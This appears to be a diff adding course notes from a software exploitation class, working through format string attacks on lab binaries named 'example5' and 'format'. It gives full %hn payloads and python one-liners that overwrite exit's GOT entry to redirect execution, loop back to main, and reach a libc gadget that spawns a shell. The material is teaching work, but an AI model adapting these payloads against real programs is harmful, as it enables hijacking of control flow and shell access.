@@ -1,0 +1,115 @@
+*************************************************************************************************
+
+Discussion of example5 
+
+DUMP THE SYMBOL TABLE
+root@ubuntu:~/cs4678/class_demos# nm example5 | grep dummy
+0000000000400676 T dummy                             ******* function we want to jump to
+0000000000400650 t frame_dummy
+0000000000600e10 t __frame_dummy_init_array_entry
+
+DUMP THE GOT TABLE
+root@ubuntu:~/cs4678/class_demos# objdump -R example5
+
+example5:     file format elf64-x86-64
+
+DYNAMIC RELOCATION RECORDS
+OFFSET           TYPE              VALUE 
+0000000000600ff8 R_X86_64_GLOB_DAT  __gmon_start__
+0000000000601060 R_X86_64_COPY     stdin@@GLIBC_2.2.5
+0000000000601080 R_X86_64_COPY     stderr@@GLIBC_2.2.5
+0000000000601018 R_X86_64_JUMP_SLOT  printf@GLIBC_2.2.5
+0000000000601020 R_X86_64_JUMP_SLOT  __libc_start_main@GLIBC_2.2.5
+0000000000601028 R_X86_64_JUMP_SLOT  fgets@GLIBC_2.2.5
+0000000000601030 R_X86_64_JUMP_SLOT  exit@GLIBC_2.2.5       ****** exit's GOT entry
+0000000000601038 R_X86_64_JUMP_SLOT  fwrite@GLIBC_2.2.5
+
+LEARN WHERE THE BUFFER STARTS FROM printf's PERSPECTIVE
+root@ubuntu:~/cs4678/class_demos# ./example5
+AAAAAAAA %p %p %p %p %p %p %p %p %p %p
+AAAAAAAA 0x602037 0x7ffff7dd3790 0x2520702520702520 0x602037 0x7ffff7fe3700 0x7fffffffe6b8 0x100000000 0x4141414141414141 0x2520702520702520 0x2070252070252070
+             1$         2$                3$            4$          5$             6$          7$                8$
+
+ADDRESS OF dummy IS WHAT WE WANT TO WRITE (controlled with widths)
+0x00400676        split into two shorts (exit has never been called so can be overwritten in two shorts in this case)
+0x0040 0x0676
+  64    1654      convert each short to decimal
+1654 - 64 = 1590  compute the difference between them
+
+%64c%11$hn%1590c%12$hnAA\x32\x10\x60\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00\x0a
+-+--|--+--|--+--|--+--|+|-ptr to high short of exit got-|-ptr to low short of exit got-|  LF makes fgets happy
+ |     |     |     |   |-pad to multiple of 8 bytes so following pointers are aligned
+ |     |     |     |-- pointer to low short begins 32 bytes = 32/8 = 4 args into buffer 8+4 = 12
+ |     |     |-- 1590 more characters gets us to 1654 == 0x676
+ |     |-- pointer to high short begins 24 bytes = 24/8 = 3 args into buffer 8+3 = 11
+ |- 64 characters gets us to 0x40, this is most significant 2 bytes of target address
+
+python -c 'print "%64c%11$hn%1590c%12$hnAA\x32\x10\x60\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00\x0a"' | ./example5
+
+******************************************************************************************
+
+Using the format string bug in the "format" binary to create a loop back to main
+
+Exit will be called AFTER offending printf
+
+exit: 0x601030   <** hijack this GOT entry  WHERE TO WRITE
+main: 0x4005f6   <** to point here          WHAT TO WRITE
+
+Because exit has yet to be called, its GOT entry still points back into PLT
+so the value we are overwriting is still a relatively small one which we are
+overwriting with another relatively small address. We can do this with two
+shorts, ie two uses of %hn
+
+split 0x4005f6 into two shorts:
+0x40 = 64       *** write this value first since it's smaller
+0x5f6 = 1526    *** write this value second since it's bigger
+
+compute the difference between them:
+1526 - 64 = 1462
+
+Based on experimentation, beginning of buffer is at 6$ from printf's perspective
+
+%64c%9$hn%1462c%10$hnAAA\x32\x10\x60\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00\x0a
+-+--|-+--|--+--|--+--|+-|-ptr to high short of exit got-|-ptr to low short of exit got-|  LF makes fgets happy
+ |    |     |     |   |-pad to multiple of 8 bytes so following pointers are aligned
+ |    |     |     |-- pointer to low short begins 32 bytes = 32/8 = 4 args into buffer 6+4 = 10
+ |    |     |-- 1462 more characters gets us to 1526 == 0x5f6
+ |    |-- pointer to high short begins 24 bytes = 24/8 = 3 args into buffer 6+3 = 9
+ |- 64 characters gets us to 0x40, this is most significant 2 bytes of target address
+
+
+(python -c 'print "%64c%9$hn%1462c%10$hnAAA\x32\x10\x60\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00\x0a"' && cat) | ./format
+
+**************************************************************************************
+
+Using the format string bug in "format" to get a shell via the "one shot" / magic gadget in libc
+
+
+magic/one shot gadget in non-randomized libc: 0x7FFFF7AFE147   *** WHAT
+(offset from libc base is 0xF1147)
+
+exit GOT -> 0x601030   *** WHERE
+
+SPLIT INTO SHORTS
+7FFF F7AF E147
+  1    3    2
+
+write 1 into 0x601034
+write 2 into 0x601030
+write 3 into 0x601032
+
+0x7FFF = 32767
+
+0xE147 = 57671 - 32767 = 24904
+
+0xF7AF = 63407 - 57671 = 5736
+
+%32767c%11$hn%24904c%12$hn%5736c%13$hnAA\x34\x10\x60\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00\x32\x10\x60\x00\x00\x00\x00\x00".ljust(0x80, "\x00")
+|------------------------------------|
+ 38 bytes of format needs 2 bytes of padding (AA)
+ 40 total bytes equates to 5 args
+ pointers start at 6$ + 5 = 11$
+
+
+(python -c 'print "%32767c%11$hn%24904c%12$hn%5736c%13$hnAA\x34\x10\x60\x00\x00\x00\x00\x00\x30\x10\x60\x00\x00\x00\x00\x00\x32\x10\x60\x00\x00\x00\x00\x00".ljust(0x80, "\x00")' && cat) | ./format
+
